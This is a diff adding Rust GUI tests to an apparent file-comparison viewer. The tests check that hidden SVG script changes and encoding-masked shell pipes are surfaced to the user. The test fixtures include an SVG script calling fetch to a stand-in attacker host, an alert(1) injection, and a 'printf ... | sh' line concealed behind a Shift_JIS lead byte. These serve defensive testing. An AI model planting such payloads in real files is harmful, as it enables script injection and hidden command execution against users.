@@ -3664,6 +3664,75 @@ fn gui_image_header_switch_offers_and_sets_the_modes(cx:&mut TestAppContext) {
     assert!(f.viewer.read_with(cx,|v,_|v.header_switch().iter().any(|c|c.2=="Difference"&&c.3)));
 }
 
+const SVG:&str="<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\">\n<rect width=\"16\" height=\"16\" fill=\"#f00\"/>\n</svg>\n";
+
+#[gpui::test]
+fn gui_svg_source_mode_shows_a_change_its_rendering_does_not(cx:&mut TestAppContext) {
+    use crate::image_session::Mode;
+    let script=SVG.replace("</svg>","<script>fetch(\"https://attacker.example.invalid/\")</script>\n</svg>");
+    let f=fixture_named(cx,SVG,&script,"svg");
+    workflow_wait(cx,&f,|v|v.image_doc().is_some());
+    assert_eq!(f.window.update(cx,|v,w,cx|{let _=v.render(w,cx);v.header_switch_labels()}).unwrap(),["2-up","Swipe","Onion skin","Difference","Source"]);
+    f.viewer.read_with(cx,|v,_|{
+        let doc=v.doc().unwrap();
+        assert!(!doc.content_identical(),"0 px changed, but the bytes differ");
+        assert!(doc.notes.iter().any(|n|n.contains("source differs")),"{:?}",doc.notes);
+        assert_eq!(v.interaction_disabled(commands::Interaction::Find),Some("Not a text comparison"),"the rendering is on screen");
+    });
+    let (x,y)=f.viewer.read_with(cx,|v,_|{let cell=v.header_switch().into_iter().find(|c|c.2=="Source").unwrap();(cell.0+cell.1/2.,v.top()-hdr_h()/2.)});
+    click(cx,&f,x,y);
+    workflow_wait(cx,&f,|v|v.comparison.diffed==v.comparison.generation);
+    f.viewer.read_with(cx,|v,_|{
+        assert_eq!(v.iview.state().mode(),Mode::Source);
+        assert!(v.image_doc().is_none()&&v.rendering_doc().is_some());
+        assert!(v.doc().unwrap().lines_on(Side::Right).iter().any(|l|l.starts_with("<script>fetch(")));
+        assert_eq!(v.comparison.view.block_ranges().len(),1,"the added line is a change block");
+        assert_eq!(v.interaction_disabled(commands::Interaction::Find),None);
+        assert!(v.header_switch().iter().any(|c|c.2=="Source"&&c.3));
+    });
+    // a diff option re-diffs the source and keeps it on screen
+    f.window.update(cx,|v,w,cx|v.run_action(crate::catalog::Action::Comparison(commands::Command::SetWhitespace(lenz_engine::WhitespaceMode::Ignore)),w,cx)).unwrap();
+    workflow_wait(cx,&f,|v|v.comparison.diffed==v.comparison.generation);
+    assert!(f.viewer.read_with(cx,|v,_|v.iview.state().mode()==Mode::Source&&v.image_doc().is_none()&&v.comparison.view.block_ranges().len()==1));
+    // back to the rendering
+    let (x,y)=f.viewer.read_with(cx,|v,_|{let cell=v.header_switch().into_iter().find(|c|c.2=="2-up").unwrap();(cell.0+cell.1/2.,v.top()-hdr_h()/2.)});
+    click(cx,&f,x,y);
+    assert!(f.viewer.read_with(cx,|v,_|v.image_doc().is_some()));
+}
+
+#[gpui::test]
+fn gui_an_svg_that_cannot_be_drawn_shows_its_text_and_says_why(cx:&mut TestAppContext) {
+    let broken=SVG.replace("width=\"16\" height=\"16\">","width=\"0\" height=\"0\">").replace("</svg>","<script>alert(1)</script>\n</svg>");
+    let f=fixture_named(cx,SVG,&broken,"svg");
+    f.viewer.read_with(cx,|v,_|{
+        let doc=v.doc().unwrap();
+        assert!(v.rendering_doc().is_none()&&doc.placeholder.is_none());
+        assert!(doc.lines_on(Side::Right).iter().any(|l|l=="<script>alert(1)</script>"));
+        assert!(doc.notes.iter().any(|n|n.starts_with("cannot show as an image")));
+        assert!(!doc.content_identical());
+    });
+    // empty text in place of differing binary Sides is not identical content either
+    let (lp,rp)=(f.dir.path().join("old.bin"),f.dir.path().join("new.bin"));
+    std::fs::write(&lp,b"\0one").unwrap();std::fs::write(&rp,b"\0two").unwrap();
+    let set=ChangeSet::load(&Spec::Plain{left:lp.clone(),right:rp.clone()},f.dir.path()).unwrap();
+    let binary=Doc::load(&set,0,&lp,&rp,false).unwrap();
+    assert!(binary.placeholder.is_some()&&!binary.content_identical());
+}
+
+#[gpui::test]
+fn gui_status_says_when_a_guessed_encoding_hides_ascii_bytes(cx:&mut TestAppContext) {
+    let f=fixture(cx,"a\n","b\n");
+    let (lp,rp)=(f.dir.path().join("old.sh"),f.dir.path().join("new.sh"));
+    // "# 設定を表示" in Shift_JIS, then a pipe after a lead byte that the guess reads as one katakana
+    let comment=b"# \x90\xDD\x92\xE8\x82\xF0\x95\x5C\x8E\xA6\n";
+    std::fs::write(&lp,[&comment[..],b"echo safe\n"].concat()).unwrap();
+    std::fs::write(&rp,[&comment[..],b"printf '%s\\n' 'echo X' \x83| sh\n"].concat()).unwrap();
+    let spec=Spec::Plain{left:lp,right:rp};let set=ChangeSet::load(&spec,f.dir.path()).unwrap();
+    f.viewer.update(cx,|v,cx|{v.spec=spec;v.show_change_set(set,cx);});
+    workflow_wait(cx,&f,|v|v.doc().is_some_and(|d|d.lines_on(Side::Right).len()>1));
+    assert!(f.viewer.read_with(cx,|v,_|v.doc().unwrap().notes.iter().any(|n|n==crate::encoding::HIDES_ASCII_NOTICE)));
+}
+
 #[gpui::test]
 fn gui_annotations_can_be_hidden_from_the_line_menu(cx:&mut TestAppContext) {
     let f=discard_fixture(cx);
